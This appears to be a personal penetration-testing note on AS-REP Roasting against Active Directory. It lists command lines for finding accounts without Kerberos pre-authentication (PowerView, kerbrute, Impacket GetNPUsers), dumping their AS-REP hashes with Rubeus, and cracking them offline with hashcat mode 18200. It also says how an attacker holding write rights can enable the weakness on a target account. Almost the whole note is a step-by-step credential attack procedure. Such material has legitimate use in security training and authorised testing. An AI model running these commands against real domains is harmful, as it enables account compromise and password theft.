Obtain TGT for any account that has “Do not require Kerberos pre-authentication” set
- Targets AS-REP, not TGS-REP (Kerberoasting)
![[../../assets/ASREPRoasting/image 376.png|image 376.png]]
  
if a user has GenericWrite or GenericAll, they can enable this attribute to the target account
  
# Enumerating for DONT_REQ_PREAUTH Value Using Get-DomainUser
```JavaScript
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```
![[../../assets/ASREPRoasting/image 1 280.png|image 1 280.png]]
  
# Retrieving AS-REP in Proper Format Using Rubeus
```JavaScript
.\Rubeus.exe asreproast /user:<target_user> /nowrap /format:hashcat
```
![[../../assets/ASREPRoasting/image 2 238.png|image 2 238.png]]
  
# Cracking the Hash Offline with Hashcat
mode 18200
```JavaScript
hashcat -m 18200 <hash> /path/to/wordlist
```
![[../../assets/ASREPRoasting/image 3 204.png|image 3 204.png]]
  
# Retrieving AS-REP Using Kerbrute
```JavaScript
kerbrute userenum -d <DOMAIN> --dc <IP> /opt/jsmith.txt 
```
![[../../assets/ASREPRoasting/image 4 179.png|image 4 179.png]]
  
# Hunting for Users with Pre-Auth using Impacket
```JavaScript
GetNPUsers.py <DOMAIN>/ -dc-ip <IP> -no-pass -usersfile valid_ad_users
```
![[../../assets/ASREPRoasting/image 5 167.png|image 5 167.png]]